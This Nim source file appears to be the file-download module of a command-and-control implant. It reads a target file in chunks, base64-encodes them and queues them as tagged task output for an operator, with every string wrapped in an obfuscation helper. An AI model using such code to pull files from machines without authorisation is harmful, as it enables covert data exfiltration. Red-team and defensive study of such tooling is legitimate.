from std/base64 import encode
import std/json
import std/parseutils
from std/strutils import strip
from posix import O_RDONLY, Stat, S_ISDIR, close, open, read
import ../utils/global
import ../utils/linapi/handlers
import ../utils/msg
import ../utils/tasks/buffer
import ../utils/tasks/tasks as tdb
import filesystem
import sleep

const chunkSize = 25 * 1024 * 1024
const maxWaitTasks = 180

proc run_download*(input, params, taskTag: string; buf: var openArray[char]): int =
  # Reads a file in chunks and sends each chunk
  discard input
  let downloadId = filesystem.paramValue(params, obf("download_id"), [obf("--download-id")])
  var filePath = filesystem.paramValue(params, obf("file"), [obf("-f"), obf("--file")])
  if filePath.len == 0:
    try:
      let p = parseJson(params)
      if p.hasKey(obf("args")):
        filePath = p[obf("args")].getStr().strip(chars = {'"', '\''})
    except JsonParsingError:
      discard
  if filePath.len == 0:
    return writeErr(obf("missing file path"), buf)
  if taskTag.len == 0:
    return writeErr(obf("missing task tag"), buf)
  let (mainHit, mainRec) = tdb.read_task(tag = taskTag)
  if not mainHit:
    return writeErr(obf("missing download task"), buf)
  let mainTaskId = mainRec.id
  var limitMb = 2024
  let sizeStr = filesystem.paramValue(params, obf("size"), [obf("--size")])
  if sizeStr.len > 0:
    var v = 0
    if parseutils.parseInt(sizeStr, v) == sizeStr.len and v > 0:
      limitMb = v
  let limitBytes = uint64(limitMb) * 1024'u64 * 1024'u64
  var st: Stat
  if not pathStat(filePath, st):
    let err = getErrno()
    return writeErr(ioErrorMessage(err), buf, culong(err))
  if S_ISDIR(st.st_mode):
    return writeErr(obf("Path is a directory"), buf)
  let fileSize = uint64(st.st_size)
  if fileSize > limitBytes:
    return writeErr(
      obf("File is larger than 2GB, use --size <int> to raise the limit (MB)"),
      buf)
  if fileSize == 0:
    return writeErr(obf("file is empty"), buf)
  let fd = open(filePath.cstring, O_RDONLY)
  if fd < 0:
    let err = getErrno()
    return writeErr(ioErrorMessage(err), buf, culong(err))
  defer:
    discard close(fd)
  var off = 0'u64
  var chunkNo = 0
  while off < fileSize:
    let want = int(min(uint64(chunkSize), fileSize - off))
    var piece = newSeq[byte](want)
    var got = 0
    while got < want:
      let n = read(fd, addr piece[got], want - got)
      if n < 0:
        let err = getErrno()
        return writeErr(ioErrorMessage(err), buf, culong(err))
      if n == 0:
        return writeErr(obf("download read interrupted"), buf)
      got += n
    let more = off + uint64(want) < fileSize
    var chunkJson = %*{
      obf("option"): obf("output"),
      obf("type"): obf("terminal"),
      obf("task_tag"): taskTag,
      obf("output"): encode(piece),
      obf("more"): more,
      obf("total"): fileSize,
    }
    if downloadId.len > 0:
      chunkJson[obf("download_id")] = %downloadId
    chunkJson[obf("task_id")] = %mainTaskId
    let outId = apply_task_output($(chunkJson), taskTag = taskTag)
    var waitCycles = 0
    while true:
      let (ok, t) = tdb.read_task(outId)
      if not ok:
        break
      if not t.pendingOut:
        break
      inc waitCycles
      if waitCycles >= maxWaitTasks:
        return writeErr(obf("download chunk wait timeout"), buf)
      sleep_now()
    off += uint64(want)
    inc chunkNo
  0
